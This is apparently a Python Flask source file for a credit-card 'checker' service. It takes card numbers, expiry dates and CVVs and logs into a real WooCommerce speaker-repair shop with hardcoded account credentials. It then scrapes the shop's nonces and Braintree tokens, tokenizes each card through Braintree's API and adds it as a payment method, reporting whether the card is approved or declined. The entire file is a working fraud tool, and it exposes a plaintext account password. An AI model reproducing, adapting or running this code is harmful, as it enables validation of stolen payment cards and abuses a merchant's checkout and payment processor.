from flask import Flask, request, jsonify
import requests
import re
import json
import base64
import random
from bs4 import BeautifulSoup
from requests import Session

app = Flask(__name__)

first_names = ["John", "James", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles", "Mary", "Patricia", "Jennifer", "Linda", "Barbara", "Elizabeth", "Susan", "Jessica", "Sarah", "Karen"]
last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Wilson", "Anderson", "Taylor", "Thomas", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson"]
domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com", "mail.com", "aol.com"]

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        'status': 'online',
        'endpoint': '/check',
        'methods': ['GET', 'POST'],
        'format_get': '/check?cc=number|month|year|cvv',
        'format_post': '{"cc": "number|month|year|cvv"}'
    })

@app.route('/check', methods=['GET', 'POST'])
def check_card():
    try:
        if request.method == 'GET':
            cc = request.args.get('cc')
            if not cc:
                return jsonify({'error': 'Missing cc parameter'}), 400
        else:
            data = request.json
            if not data or 'cc' not in data:
                return jsonify({'error': 'Missing cc parameter'}), 400
            cc = data['cc']
        
        cc, mm, yy, cvv = cc.split('|')
    except ValueError:
        return jsonify({'error': 'Invalid format. Use: number|month|year|cvv'}), 400
    except Exception as e:
        return jsonify({'error': str(e)}), 400
    
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    domain = random.choice(domains)
    email = f"{first_name.lower()}{random.randint(100, 999)}@{domain}"
    
    r = Session()
    
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'upgrade-insecure-requests': '1',
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'accept-language': 'en-US,en;q=0.9'
        }
        
        response1 = r.get('https://www.midwestspeakerrepair.com/my-account/', headers=headers)
        soup = BeautifulSoup(response1.text, 'html.parser')
        login_nonce = soup.find('input', {'name': 'woocommerce-login-nonce'})
        login_nonce = login_nonce.get('value') if login_nonce else None
        
        login_data = {
            'username': 'opdevildragon@gmail.com',
            'password': 'DDcc55@&#',
            'woocommerce-login-nonce': login_nonce,
            '_wp_http_referer': '/my-account/',
            'login': 'Login'
        }
        
        response2 = r.post('https://www.midwestspeakerrepair.com/my-account/', data=login_data, headers=headers)
        
        response3 = r.get('https://www.midwestspeakerrepair.com/my-account/add-payment-method/', headers=headers)
        soup2 = BeautifulSoup(response3.text, 'html.parser')
        payment_nonce = soup2.find('input', {'name': 'woocommerce-add-payment-method-nonce'})
        payment_nonce = payment_nonce.get('value') if payment_nonce else None
        
        client_token_match = re.search(r'"client_token_nonce":"([^"]+)"', response3.text)
        if not client_token_match:
            client_token_match = re.search(r'type":"credit_card","client_token_nonce":"([^"]+)"', response3.text)
        client_token_nonce = client_token_match.group(1) if client_token_match else None
        
        ajax_headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            'x-requested-with': 'XMLHttpRequest',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.midwestspeakerrepair.com',
            'referer': 'https://www.midwestspeakerrepair.com/my-account/add-payment-method/',
        }
        
        ajax_data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client_token_nonce
        }
        
        response4 = r.post('https://www.midwestspeakerrepair.com/wp-admin/admin-ajax.php', data=ajax_data, headers=ajax_headers)
        ajax_response = response4.json()
        token_data = json.loads(base64.b64decode(ajax_response['data']).decode('utf-8'))
        auth = token_data.get('authorizationFingerprint')
        braintree_session_id = ''.join(random.choices('abcdef0123456789', k=32))
        
        tokenize_headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            'Content-Type': 'application/json',
            'Authorization': f'Bearer {auth}',
            'Braintree-Version': '2018-05-10',
            'Origin': 'https://assets.braintreegateway.com',
            'Referer': 'https://assets.braintreegateway.com/',
        }
        
        tokenize_payload = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': braintree_session_id,
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance } } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvv,
                    },
                    'options': {'validate': False},
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        
        response5 = r.post('https://payments.braintree-api.com/graphql', json=tokenize_payload, headers=tokenize_headers)
        tokenize_result = response5.json()
        payment_token = tokenize_result['data']['tokenizeCreditCard']['token']
        
        correlation_id = ''.join(random.choices('abcdef0123456789', k=24))
        
        submit_data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'visa',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '13.00',
            'wc_braintree_credit_card_payment_nonce': payment_token,
            'wc_braintree_device_data': f'{{"correlation_id":"{correlation_id}"}}',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'wc_braintree_paypal_payment_nonce': '',
            'wc-braintree-paypal-context': 'shortcode',
            'wc_braintree_paypal_amount': '13.00',
            'wc_braintree_paypal_currency': 'USD',
            'wc_braintree_paypal_locale': 'en_us',
            'wc-braintree-paypal-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': payment_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1'
        }
        
        response6 = r.post('https://www.midwestspeakerrepair.com/my-account/add-payment-method/', data=submit_data, headers=headers)
        
        soup3 = BeautifulSoup(response6.text, 'html.parser')
        error_element = soup3.find('ul', class_='woocommerce-error')
        error_message = None
        if error_element:
            li_items = error_element.find_all('li')
            if li_items:
                error_message = li_items[0].text.strip()
        
        if re.search(r'Avs|avs|Nice|Added|Successfully', response6.text):
            result = "Approved-1000 ✅"
        elif error_message and 'Status code' in error_message:
            result = f"Declined: {error_message}"
        elif error_message:
            result = f"Declined: {error_message}"
        else:
            result = "Approved-1000 ✅"
        
        return jsonify({
            'result': result,
            'card': cc,
            'email': email,
            'first_name': first_name,
            'last_name': last_name
        }), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
